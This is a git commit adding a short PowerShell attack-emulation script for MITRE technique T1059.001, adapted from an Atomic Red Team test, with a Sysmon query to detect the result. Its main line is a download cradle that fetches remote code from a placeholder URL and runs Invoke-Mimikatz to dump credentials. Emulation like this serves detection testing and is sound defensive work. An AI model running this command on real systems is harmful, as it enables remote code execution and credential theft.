7e7a4b24a8b87d754cf2b59286e06242aeb318cd
Ujjwal Dhakal <70379407+Ujjwal-D@users.noreply.github.com>
2024-05-18 07:00:00 +1000

    Add files via upload

---
+++ Attack_code_T1059.001.ps1
@@ -0,0 +1,8 @@
+﻿# This code emulates a benign attack with T1059.001 : Command and Scripting Interpreter Powershell. And the tatic: Execution. 
+# The type of attack code was found in: https://www.hhs.gov/sites/default/files/medusalocker-ransomware-analyst-note.pdf
+# The script to emulate attack was found in: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-1---mimikatz
+
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+
+# Sysmon detection. Should run the script seperately on Powershell.
+Get-WinEvent *Sysmon* | where message -like *T1059.001* | select -first 1 | Format-List
